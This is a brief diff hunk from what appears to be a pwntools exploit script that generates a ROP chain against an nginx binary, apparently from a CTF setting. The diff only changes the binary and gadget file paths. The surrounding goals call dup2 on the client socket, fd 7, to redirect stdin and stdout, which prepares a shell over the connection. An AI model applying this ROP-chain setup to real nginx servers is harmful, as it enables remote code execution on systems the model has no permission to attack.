@@ -2,7 +2,7 @@ import sys, logging, struct
 from pwn import *
 from rop_compiler import ropme, goal, gadget
 
-files = [('./example/bkp/blah/nginx', './example/bkp/blah/nginx.gadgets', 0)] # Use stored gadgets file for quicker generation
+files = [('./nginx', './nginx.gadgets', 0)] # Use stored gadgets file for quicker generation
 goals = [
   ["function", "dup2", 7, 0], # socket fd 7 = client socket
   ["function", "dup2", 7, 1], # socket fd 7 = client socket
